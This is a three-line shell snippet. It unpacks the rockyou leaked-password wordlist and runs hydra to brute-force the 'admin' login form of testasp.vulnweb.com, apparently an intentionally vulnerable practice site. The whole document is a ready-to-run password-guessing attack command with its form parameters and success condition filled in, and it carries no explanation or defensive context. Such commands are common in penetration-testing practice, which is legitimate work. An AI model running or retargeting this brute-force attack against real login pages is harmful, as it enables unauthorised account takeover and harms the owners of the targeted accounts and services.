cd /usr/share/wordlists
sudo gzip -d rockyou.txt.gz
hydra -l admin -P rockyou.txt testasp.vulnweb.com http-post-form "/Login.asp?RetURL=%2FDefault%2Easp%3F:tfUName=^USER^&tfUPass=^PASS^:S=logout" -vV -f
